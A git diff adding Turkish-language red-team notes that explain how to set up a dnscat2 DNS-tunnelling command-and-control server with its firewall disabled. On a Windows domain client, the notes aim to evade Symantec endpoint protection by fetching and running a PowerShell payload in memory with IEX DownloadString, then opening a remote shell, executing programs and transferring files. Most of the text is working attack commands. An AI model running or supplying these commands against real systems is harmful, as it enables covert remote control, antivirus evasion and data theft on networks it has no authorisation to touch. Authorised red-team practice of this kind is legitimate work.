@@ -16,3 +16,66 @@ start calc.exe etc.
 
 server,host=> kali local ip
 secret=> secret key when you run the server side command
+
+
+########
+
+server (c&c=digital ocean):
+----------------
+public ipv4 adresini öğren (x.x.x.x)
+fw kurallarında client makinesinin internete çıkış ipsini all udp tcp ekle hepsine.
+
+
+
+console u aç ve fw disable et:
+
+
+
+$ ufw status
+$ ufw disable
+
+
+ruby kur
+dnscat2 kur.
+dnscat2 çalıştır.
+
+
+$ ruby dnscat2.rb --security open --no-cache --dns "domain=rt.dnstestykb.cf,host=134.209.26.137"
+
+
+
+not: host=x.x.x.x=> public v4 adresi digital ocean c&c sunucusunun.
+
+
+
+client(windows 10-ad domain ortamı-vpn kapatılarak)-SEP bypass edebilmek için alarma takılmamak için;
+---------------------------
+
+
+
+diske indirmeden hafızaya kaydetme:
+$ powershell.exe
+
+$ IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/FerdiGul/RedTeam/main/DNS/dnscat/dnscat2.ps1')
+$ Start-Dnscat2 -Domain rt.dnstestykb.cf -DNSServer x.x.x.x -NoEncryption
+
+
+server
+----------------
+sesion açıldığı bilgisi göreceksin "new session opened 1" gibi
+$ help
+#yeni session içine gir:
+$ session -i 1
+$ help
+#shell alma
+$ shell
+#shell ekranına geçmek için yeni session açıldığını söyler:
+$ session -i 2
+# shell ekranından çıkıp ilk sessiona dönmek için tekrar:
+$ exit
+$ session -i 1
+$ help
+# uzak sunucuda calc.exe çalıştırma
+$ exec calc.exe
+# uzak sunucuya dosya transferi veya dosya yüklemek için
+$ download ve upload komutları kullanılır.
